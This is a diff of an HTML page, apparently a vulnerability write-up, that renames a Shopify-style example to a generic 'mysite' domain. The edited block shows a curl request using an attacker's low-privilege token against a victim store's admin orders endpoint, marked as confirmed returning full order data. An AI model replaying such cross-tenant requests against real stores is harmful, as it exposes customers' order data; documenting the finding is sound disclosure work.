@@ -368,8 +368,8 @@
                     </div>
                     <div style="padding:14px 16px; line-height:1.9; color:#a1a1aa;">
                         <span style="color:var(--muted);"># Attacker's low-priv store token used against victim tenant</span><br>
-                        <span style="color:var(--lime);">curl</span> -X POST <span style="color:#60a5fa;">"https://victim-store.myshopify.com/admin/api/orders.json"</span> \<br>
-                        &nbsp;&nbsp;-H <span style="color:#60a5fa;">"X-Shopify-Access-Token: <span style="color:var(--crit);">[ATTACKER_TOKEN]</span>"</span> \<br>
+                        <span style="color:var(--lime);">curl</span> -X POST <span style="color:#60a5fa;">"https://victim-store.mysite.com/admin/api/orders.json"</span> \<br>
+                        &nbsp;&nbsp;-H <span style="color:#60a5fa;">"X-mysite-Access-Token: <span style="color:var(--crit);">[ATTACKER_TOKEN]</span>"</span> \<br>
                         &nbsp;&nbsp;-H <span style="color:#60a5fa;">"Content-Type: application/json"</span><br>
                         <span style="color:var(--lime);"># Returns 200 + full order data</span> <span style="color:var(--crit);">← CONFIRMED</span>
                     </div>
